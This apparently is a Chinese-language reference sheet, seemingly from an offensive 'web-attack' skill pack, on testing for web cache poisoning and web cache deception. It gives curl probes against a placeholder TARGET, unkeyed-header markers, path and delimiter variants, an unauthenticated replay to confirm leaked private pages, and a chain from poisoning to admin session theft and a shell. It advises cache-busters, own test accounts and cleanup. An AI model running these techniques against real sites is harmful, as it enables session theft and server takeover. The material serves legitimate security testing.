# Web Cache Poisoning / Web Cache Deception 详细参考

> 两类漏洞要分开：
> - **Poisoning**：让攻击者控制的响应被缓存并送给其他用户。
> - **Deception**：让本应私有/动态的受害者响应被缓存到攻击者可读取的 key。

---

## 1. 先确认真的有 Cache

```
for i in 1 2 3; do
  curl -skI 'https://TARGET/static/app.js?cb=cachetest' | \
    grep -Ei '^(age|x-cache|cf-cache-status|via|cache-control|vary|etag):'
  sleep 1
done
```

信号：

```
MISS → HIT
Age递增
X-Cache: HIT
CF-Cache-Status: HIT
```

没有 header 也可能有 internal cache，需用响应时间/内容一致性继续判断。

---

## 2. Poisoning — 找 Unkeyed Input

### Header 影响响应但不进 Cache Key

用唯一 marker：

```
X-Forwarded-Host: cacheprobe.invalid
X-Forwarded-Scheme: http
X-Original-URL: /cacheprobe
X-Rewrite-URL: /cacheprobe
Forwarded: host=cacheprobe.invalid
```

请求：

```
curl -sk https://TARGET/ \
  -H 'X-Forwarded-Host: cacheprobe.invalid' \
  -D headers.txt -o body.txt

grep -ni 'cacheprobe.invalid' body.txt headers.txt
```

如果 marker 出现在：

```
Location
canonical URL
script src
OG URL
absolute link
```

再判断该 header 是否进入 cache key。

### 安全 Cache Buster

测试时带不会被正常用户命中的 query：

```
?cb=RANDOM
```

先证明机制，再考虑是否存在共享 key；不要直接污染首页。

---

## 3. Query Parameter Cache Key

```
/resource?x=1
/resource?x=2
/resource?utm_source=a
/resource?utm_source=b
```

某些 tracking 参数会被 cache 忽略，但 backend 仍会使用；这类“unkeyed query parameter”是 poisoning 候选。

对比：

```
status
body hash
Age/X-Cache
```

---

## 4. Path / Delimiter Differential — Cache Deception

现代高价值测试：CDN/cache 与 origin 对 path 的解释不同。

假设私有页面：

```
/account
```

在**自己的测试账户**上先测试：

```
/account/test.css
/account;.css
/account%3Ftest.css
/account%23test.css
/account/test.js
/account/..%2fstatic/x.css
```

如果：

```
Origin → 仍返回 /account 私有内容
Cache  → 因 .css/.js/static path 规则缓存
```

则可能形成 Web Cache Deception。

### 关键检查

请求受害者私有页面变体后，退出登录/无 Cookie 再请求同一 URL：

```
# 已登录请求（仅自己的靶场账户）
curl -skb cookies.txt 'https://TARGET/account/x.css' -D a.h -o a.body

# 无认证重放
curl -sk 'https://TARGET/account/x.css' -D b.h -o b.body
```

无认证仍返回已登录内容 + cache hit → 强证据。

---

## 5. Static Extension / Directory / File Rules

常见 cache rule：

```
*.css *.js *.png *.jpg *.svg *.woff
/static/
/assets/
/_next/static/
```

不要只测扩展名；2024+ cache research 强调：

```
front-end delimiter
back-end delimiter
normalization order
encoded delimiter
```

组合才是核心。

---

## 6. Cache Key Normalization

测试：

```
/path
/path/
/path//
/path/./
/path/%2e/
/PATH
/path%2Fchild
/path;child
```

比较 cache 与 origin 是否把不同 URL 归到同一个 key/handler。

---

## 7. 内部/Framework Cache

有些应用除了 CDN 还有：

```
Next.js data cache
framework route cache
reverse proxy microcache
application object cache
```

信号：

```
外层Cache MISS但内容持续错误
x-nextjs-cache
x-vercel-cache
age缺失但响应被固定
```

如果某个 unkeyed internal header 改变内部响应，仍可形成 poisoning。

---

## 8. Cache Poisoning → Shell

Poisoning 常直接得到的是：

```
stored XSS
open redirect
恶意JS引用
password reset host poisoning
admin UI内容污染
```

本 skill 目标仍是 Shell：

```
cache poisoning
  ↓
管理员session/管理员操作/高权限token
  ↓
admin upload/plugin/template/command feature
  ↓
Shell
```

如果只能证明跨用户 XSS/数据泄露，漏洞成立但 `/web-attack` 尚未完成。

---

## 9. 清理/避免持久污染

- 首轮必须使用 cache-buster 隔离。
- 靶场中如果确认共享 key 被污染，测试结束后用正常请求覆盖/等待 TTL。
- 记录 `Age`, `Cache-Control`, `X-Cache`, key 输入、污染时间和 TTL。
